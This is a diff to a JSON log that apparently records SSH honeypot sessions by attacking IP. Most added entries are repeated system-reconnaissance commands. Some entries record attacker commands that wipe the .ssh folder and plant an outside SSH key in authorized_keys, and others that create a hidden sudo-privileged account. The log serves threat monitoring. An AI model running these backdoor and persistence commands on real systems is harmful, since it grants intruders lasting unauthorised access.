@@ -413,6 +413,24 @@
             "event": "command_input",
             "input": "uname -s -v -n -r -m",
             "session": "06934e784f96"
+        },
+        {
+            "timestamp": "2023-11-11T09:49:08.068130Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "d854dc48db77"
+        },
+        {
+            "timestamp": "2023-11-11T09:54:38.346867Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "da160c92e390"
+        },
+        {
+            "timestamp": "2023-11-11T10:00:08.627308Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "ddab32e6be25"
         }
     ],
     "141.98.11.90": [
@@ -735,6 +753,478 @@
             "event": "command_input",
             "input": "uname -s -v -n -r -m",
             "session": "ff419e7c5aa8"
+        },
+        {
+            "timestamp": "2023-11-11T09:10:19.665903Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "a6a281a3c9f4"
+        },
+        {
+            "timestamp": "2023-11-11T09:11:11.786898Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "90ab412f5b28"
+        },
+        {
+            "timestamp": "2023-11-11T09:11:46.097658Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "1d0d470b16b2"
+        },
+        {
+            "timestamp": "2023-11-11T09:11:57.193105Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "b1a638429555"
+        },
+        {
+            "timestamp": "2023-11-11T09:12:03.074069Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "fe1c2086decd"
+        },
+        {
+            "timestamp": "2023-11-11T09:12:08.961612Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "b706b42247d8"
+        },
+        {
+            "timestamp": "2023-11-11T09:12:14.650477Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "036994a58245"
+        },
+        {
+            "timestamp": "2023-11-11T09:12:26.039765Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "6c18a0dcc952"
+        },
+        {
+            "timestamp": "2023-11-11T09:13:46.352057Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "48e9477e04c2"
+        },
+        {
+            "timestamp": "2023-11-11T09:14:53.831366Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "d8de48726d46"
+        },
+        {
+            "timestamp": "2023-11-11T09:14:59.629375Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "4e288bb577d9"
+        },
+        {
+            "timestamp": "2023-11-11T09:15:44.866159Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "d36fed2a7577"
+        },
+        {
+            "timestamp": "2023-11-11T09:16:01.622963Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "481b124f8ea8"
+        },
+        {
+            "timestamp": "2023-11-11T09:17:47.186143Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "4d3f48708997"
+        },
+        {
+            "timestamp": "2023-11-11T09:18:15.539348Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "65603a848f2c"
+        },
+        {
+            "timestamp": "2023-11-11T09:18:21.331659Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "38a36dde4691"
+        },
+        {
+            "timestamp": "2023-11-11T09:18:48.483694Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "f602d343d808"
+        },
+        {
+            "timestamp": "2023-11-11T09:18:53.973747Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "65cb9065882f"
+        },
+        {
+            "timestamp": "2023-11-11T09:19:16.110348Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "29ec3cf72343"
+        },
+        {
+            "timestamp": "2023-11-11T09:19:32.451496Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "a052952d4db3"
+        },
+        {
+            "timestamp": "2023-11-11T09:20:28.154500Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "3010bdf6fae7"
+        },
+        {
+            "timestamp": "2023-11-11T09:20:39.454536Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "86c92b6315ee"
+        },
+        {
+            "timestamp": "2023-11-11T09:21:34.635218Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "4681293b7637"
+        },
+        {
+            "timestamp": "2023-11-11T09:22:13.767903Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "c3ec2c8512e0"
+        },
+        {
+            "timestamp": "2023-11-11T09:22:41.516532Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "7a6329d385fe"
+        },
+        {
+            "timestamp": "2023-11-11T09:23:20.762464Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "d036e391bef1"
+        },
+        {
+            "timestamp": "2023-11-11T09:23:26.448175Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "b6b65aac6148"
+        },
+        {
+            "timestamp": "2023-11-11T09:23:31.826256Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "9692727db442"
+        },
+        {
+            "timestamp": "2023-11-11T09:23:37.672203Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "b708a0135d70"
+        },
+        {
+            "timestamp": "2023-11-11T09:23:43.179660Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "2d8dd3d23fa1"
+        },
+        {
+            "timestamp": "2023-11-11T09:25:01.385232Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "a0f7a5bb849c"
+        },
+        {
+            "timestamp": "2023-11-11T09:25:23.476935Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "e4698f5a2d59"
+        },
+        {
+            "timestamp": "2023-11-11T09:25:29.139852Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "1d70fa750d06"
+        },
+        {
+            "timestamp": "2023-11-11T09:26:41.389410Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "75f98f9bc327"
+        },
+        {
+            "timestamp": "2023-11-11T09:27:03.709212Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "646a55193d0e"
+        },
+        {
+            "timestamp": "2023-11-11T09:27:14.633846Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "7201027bdebc"
+        },
+        {
+            "timestamp": "2023-11-11T09:27:25.583845Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "4dfe1692f68b"
+        },
+        {
+            "timestamp": "2023-11-11T09:27:36.998962Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "5c29938dc267"
+        },
+        {
+            "timestamp": "2023-11-11T09:27:59.063021Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "6cefa87e0ef6"
+        },
+        {
+            "timestamp": "2023-11-11T09:28:04.711529Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "083858a46bbf"
+        },
+        {
+            "timestamp": "2023-11-11T09:28:21.434629Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "5f9cba013d4e"
+        },
+        {
+            "timestamp": "2023-11-11T09:29:00.474880Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "d1c96f6cb99d"
+        },
+        {
+            "timestamp": "2023-11-11T09:29:06.093048Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "702f202aa406"
+        },
+        {
+            "timestamp": "2023-11-11T09:29:28.399355Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "f71720154e22"
+        },
+        {
+            "timestamp": "2023-11-11T09:29:33.864970Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "98dfec23c5a4"
+        },
+        {
+            "timestamp": "2023-11-11T09:29:44.905053Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "5d2084391bac"
+        },
+        {
+            "timestamp": "2023-11-11T09:30:18.798232Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "9e854ac8871d"
+        },
+        {
+            "timestamp": "2023-11-11T09:31:03.097024Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "a21fe7cee7e3"
+        },
+        {
+            "timestamp": "2023-11-11T09:31:14.375181Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "8bbcfed3b1a2"
+        },
+        {
+            "timestamp": "2023-11-11T09:31:36.663509Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "215989600f15"
+        },
+        {
+            "timestamp": "2023-11-11T09:32:21.172741Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "5297e1dc1180"
+        },
+        {
+            "timestamp": "2023-11-11T09:32:26.750632Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "6995e345f30e"
+        },
+        {
+            "timestamp": "2023-11-11T09:33:22.516299Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "cf2bc422166e"
+        },
+        {
+            "timestamp": "2023-11-11T09:33:33.631840Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "b0cb5b727ba5"
+        },
+        {
+            "timestamp": "2023-11-11T09:33:44.973016Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "bb249a0678b2"
+        },
+        {
+            "timestamp": "2023-11-11T09:34:01.521807Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "02406350729c"
+        },
+        {
+            "timestamp": "2023-11-11T09:34:07.010966Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "174b3c3aded0"
+        },
+        {
+            "timestamp": "2023-11-11T09:34:45.390595Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "4839488bd651"
+        },
+        {
+            "timestamp": "2023-11-11T09:35:41.309582Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "985badf0f7c7"
+        },
+        {
+            "timestamp": "2023-11-11T09:36:03.286441Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "add2505cca71"
+        },
+        {
+            "timestamp": "2023-11-11T09:36:36.052569Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "9f829e54c7fd"
+        },
+        {
+            "timestamp": "2023-11-11T09:36:57.751692Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "f7fb2e0dd4bb"
+        },
+        {
+            "timestamp": "2023-11-11T09:37:03.329776Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "b8719027a1ad"
+        },
+        {
+            "timestamp": "2023-11-11T09:37:25.171346Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "a8e38959d239"
+        },
+        {
+            "timestamp": "2023-11-11T09:37:58.157347Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "459ff8152a0a"
+        },
+        {
+            "timestamp": "2023-11-11T09:38:03.765803Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "4d0f30f1051f"
+        },
+        {
+            "timestamp": "2023-11-11T09:38:14.803651Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "b11ab552d07c"
+        },
+        {
+            "timestamp": "2023-11-11T09:38:20.373256Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "24f6f2a4ac55"
+        },
+        {
+            "timestamp": "2023-11-11T09:38:25.880319Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "89efe0bca6c0"
+        },
+        {
+            "timestamp": "2023-11-11T09:39:09.764223Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "2b572d3fe218"
+        },
+        {
+            "timestamp": "2023-11-11T09:39:15.281127Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "87f60f6aff54"
+        }
+    ],
+    "43.134.226.192": [
+        {
+            "timestamp": "2023-11-11T09:50:40.137708Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "614d503f8f07"
+        },
+        {
+            "timestamp": "2023-11-11T09:50:40.823329Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "614d503f8f07"
+        },
+        {
+            "timestamp": "2023-11-11T09:50:41.019384Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "614d503f8f07"
+        }
+    ],
+    "188.166.228.153": [
+        {
+            "timestamp": "2023-11-11T09:57:25.220695Z",
+            "event": "command_input",
+            "input": "apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 wh48NdbD) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system",
+            "session": "a3f14657e732"
+        },
+        {
+            "timestamp": "2023-11-11T09:57:25.221094Z",
+            "event": "command_input",
+            "input": "openssl passwd -1 wh48NdbD",
+            "session": "a3f14657e732"
+        },
+        {
+            "timestamp": "2023-11-07T20:16:24.164052Z",
+            "event": "command_input",
+            "input": "apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 7pmb9Zp6) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system",
+            "session": "cb76c37b82db"
+        },
+        {
+            "timestamp": "2023-11-07T20:16:24.164514Z",
+            "event": "command_input",
+            "input": "openssl passwd -1 7pmb9Zp6",
+            "session": "cb76c37b82db"
         }
     ],
     "159.65.146.149": [
@@ -24817,20 +25307,6 @@
             "event": "file_download",
             "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
             "session": "f02c950513fd"
-        }
-    ],
-    "188.166.228.153": [
-        {
-            "timestamp": "2023-11-07T20:16:24.164052Z",
-            "event": "command_input",
-            "input": "apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 7pmb9Zp6) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system",
-            "session": "cb76c37b82db"
-        },
-        {
-            "timestamp": "2023-11-07T20:16:24.164514Z",
-            "event": "command_input",
-            "input": "openssl passwd -1 7pmb9Zp6",
-            "session": "cb76c37b82db"
         }
     ],
     "143.110.190.199": [
